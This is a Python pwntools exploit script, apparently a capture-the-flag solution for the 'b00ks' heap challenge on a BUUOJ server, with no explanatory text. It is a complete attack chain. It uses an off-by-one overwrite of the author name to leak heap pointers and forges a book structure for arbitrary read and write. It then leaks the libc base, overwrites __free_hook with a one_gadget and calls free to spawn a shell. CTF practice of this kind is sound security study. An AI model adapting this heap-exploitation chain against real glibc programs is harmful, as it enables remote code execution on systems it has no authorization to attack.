#libc2.27
from pwn import *
from pwn import p64
from LibcSearcher import *

context.log_level = 'debug'

p = remote("node4.buuoj.cn",25568)
#p=process("./b00ks")
elf = ELF("./b00ks")
libc = ELF("/home/kali/Desktop/chlibc/libs/2.27-3ubuntu1_amd64/libc.so.6")

def create(name_size,name,des_size,des):
    p.recvuntil(b"> ")
    p.sendline(b'1')
    p.recvuntil(b": ")
    p.sendline(str(name_size))
    p.recvuntil(b": ")
    p.sendline(name)
    p.recvuntil(b": ")
    p.sendline(str(des_size)) 
    p.recvuntil(b": ")
    p.sendline(des)
def delete(book_id):
    p.recvuntil("> ")
    p.sendline(b'2')
    p.recvuntil(b": ")
    p.sendline(str(book_id))
def editbook(book_id,new_des):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(str(book_id))
    p.recvuntil(b": ")
    p.sendline(new_des)
def createname(name):
	p.recvuntil("name: ")
	p.sendline(name)
def printbook(id):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b": ")
    for i in range(id):
        book_id = int(p.recvline()[:-1])
        p.recvuntil(b": ")
        book_name = p.recvline()[:-1]
        p.recvuntil(b": ")
        book_des = p.recvline()[:-1]
        p.recvuntil(b": ")
        book_author = p.recvline()[:-1]
    return book_id,book_name,book_des,book_author
def change(name):
    p.recvuntil(b"> ")
    p.sendline(b'5')
    p.recvuntil(b': ')
    p.sendline(name)

createname('stoneaaabbbbbbbbccccccccdddddddd')
create(128,"stone_boo1",32,"stone_desc1")
create(0x21000,"stone_boo2",0x21000,"stone_desc2")
book_id_1,book_name,book_des,book_author=printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,b'\x00'))
print(hex(book1_addr))
print(book_id_1)
#gdb.attach(p)

payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
editbook(book_id_1,payload)
change("stoneaaabbbbbbbbccccccccdddddddd")
#gdb.attach(p)


book_id_1, book_name, book_des, book_author = printbook(1)
book2_name_addr = u64(book_name.ljust(8,b"\x00"))
book2_des_addr = u64(book_des.ljust(8,b"\x00"))
print(hex(book2_name_addr))
print(hex(book2_des_addr))
#gdb.attach(p)
libc_base = book2_name_addr - 0x5ee010
print(hex(libc_base))
#gdb.attach(p)

free_hook = libc_base + libc.symbols["__free_hook"] 
one_gadget = libc_base + 0x4f322 #0x4525a 0xef9f4 0xf0897
print(hex(free_hook))
print(hex(one_gadget))
editbook(1, p64(free_hook))
editbook(2, p64(one_gadget))
delete(2)

p.interactive()
